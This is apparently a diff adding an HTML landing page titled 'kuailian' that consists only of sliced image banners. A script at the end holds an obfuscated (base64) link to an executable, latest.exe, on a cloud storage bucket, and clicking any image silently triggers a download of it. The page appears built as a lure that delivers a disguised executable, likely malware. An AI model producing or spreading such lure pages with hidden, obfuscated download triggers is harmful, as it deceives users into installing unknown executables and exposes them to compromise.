@@ -1,0 +1,92 @@
+<html>
+<head>
+<title>kuailian</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<!-- Save for Web Slices (kuailian.psd) -->
+<table id="__01"  border="0" cellpadding="0" cellspacing="0">
+	<tr>
+		<td>
+			<img src="images/kuailian_01.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_02.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_03.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_04.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_05.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_06.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_07.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_08.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_09.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_10.png" width="100%" alt="" /></td>
+	</tr>
+	<tr>
+		<td>
+			<img src="images/kuailian_11.png" width="100%" alt="" /></td>
+	</tr>
+</table>
+	<script>
+        
+        const encryptedUrls = [
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+		    'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU=',
+            'aHR0cHM6Ly9hcHNjb3duMS5vc3MtYXAtc291dGhlYXN0LTEuYWxpeXVuY3MuY29tL2xhdGVzdC5leGU='
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>  
+
+</body>
+</html>
